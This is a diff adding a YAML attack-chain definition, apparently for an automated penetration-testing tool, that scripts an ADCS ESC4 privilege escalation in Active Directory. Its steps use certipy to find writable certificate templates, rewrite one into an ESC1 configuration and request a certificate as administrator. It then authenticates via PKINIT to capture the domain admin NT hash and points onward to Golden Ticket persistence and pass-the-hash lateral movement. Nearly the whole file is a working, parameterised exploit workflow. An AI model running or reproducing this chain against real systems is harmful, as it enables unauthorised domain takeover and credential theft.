@@ -1,0 +1,124 @@
+id: esc4-adcs-template-acl
+name: "ADCS ESC4 — vulnerable template ACL (modify-to-ESC1)"
+description: >
+  You have GenericAll / GenericWrite / WriteOwner / WriteDacl on a
+  certificate template. Rewrite the template into an ESC1 configuration
+  (ENROLLEE_SUPPLIES_SUBJECT + Client Auth EKU + low-priv enrollment),
+  then exploit it as ESC1, then revert.
+tags: [adcs, esc4, priv-esc, certificates, dacl-abuse, active-directory]
+difficulty: hard
+
+inputs:
+  - name: dc_ip
+    source: target_context.ip
+    required: true
+  - name: domain
+    source: target_context.domain
+    required: true
+  - name: user
+    source: target_context.user
+    required: true
+  - name: password
+    source: target_context.password
+    required: true
+
+steps:
+  - id: find_esc4
+    name: "Find ESC4 templates (your principal has write rights)"
+    command_ref: certipy-find
+    inputs:
+      ip: "${dc_ip}"
+      domain: "${domain}"
+      user: "${user}"
+      password: "${password}"
+    notes: |
+      Look for `Vulnerabilities: ESC4` plus your principal in `Permissions`
+      with `Full Control` or `Write`.
+    capture:
+      - var: target_template
+        regex: 'Template Name\s*:\s*(\S+)\s*\n[\s\S]*?Vulnerabilities[\s\S]*?ESC4'
+        match: first
+      - var: ca_name
+        regex: 'CA Name\s*:\s*(.+?)$'
+        match: first
+
+  - id: save_original
+    name: "Save the original template config (CRITICAL — for rollback)"
+    inline_command: "certipy template -u '<user>@<domain>' -p '<password>' -dc-ip <dc-ip> -template '<tpl>' -save-old"
+    inputs:
+      domain: "${domain}"
+      user: "${user}"
+      password: "${password}"
+      dc-ip: "${dc_ip}"
+      tpl: "${target_template}"
+    notes: |
+      `-save-old` writes the original ACL/EKUs to <tpl>.json. ALWAYS do
+      this before the next step — otherwise revert is painful.
+
+  - id: rewrite_to_esc1
+    name: "Rewrite template into an ESC1 configuration"
+    command_ref: certipy-template
+    requires: [target_template]
+    inputs:
+      domain: "${domain}"
+      user: "${user}"
+      password: "${password}"
+      dc-ip: "${dc_ip}"
+    notes: |
+      Default behavior (no `-configuration` arg) makes the template into
+      the canonical ESC1 form. Verify with certipy-find again — it should
+      now flag the template as ESC1 too.
+
+  - id: exploit_as_esc1
+    name: "Exploit as ESC1 → cert as Administrator"
+    command_ref: certipy-esc1
+    requires: [target_template, ca_name]
+    inputs:
+      domain: "${domain}"
+      user: "${user}"
+      password: "${password}"
+      dc-ip: "${dc_ip}"
+      ca_name: "${ca_name}"
+      vulnerable_template: "${target_template}"
+      target_user: "administrator"
+    capture:
+      - var: pfx_file
+        regex: "Saved certificate and private key to '(.+?\\.pfx)'"
+        match: first
+
+  - id: pkinit_auth
+    name: "Authenticate via PKINIT → DA NT hash"
+    command_ref: certipy-auth
+    requires: [pfx_file]
+    inputs:
+      pfx_file: "${pfx_file}"
+      ip: "${dc_ip}"
+    capture:
+      - var: dc_nt_hash
+        regex: "(?:NT hash|Got hash for[^:]+):[^a-f0-9]*([a-f0-9]{32})"
+        match: first
+
+  - id: restore_template
+    name: "RESTORE template (re-apply -save-old config)"
+    inline_command: "certipy template -u '<user>@<domain>' -p '<password>' -dc-ip <dc-ip> -template '<tpl>' -configuration <tpl>.json"
+    inputs:
+      domain: "${domain}"
+      user: "${user}"
+      password: "${password}"
+      dc-ip: "${dc_ip}"
+      tpl: "${target_template}"
+    notes: |
+      Roll back the template. Polite for labs and stops anyone else from
+      reusing your footing trick.
+
+references:
+  - title: "Certified Pre-Owned — ESC4"
+    url:   "https://posts.specterops.io/certified-pre-owned-d95910965cd2"
+
+next_chains:
+  - chain: ad-persistence-golden-ticket
+    when:   'dc_nt_hash captured'
+    reason: 'You hold the DA — persist via Golden Ticket.'
+  - chain: pth-lateral-spread
+    when:   'dc_nt_hash captured'
+    reason: 'Spread the DA hash.'
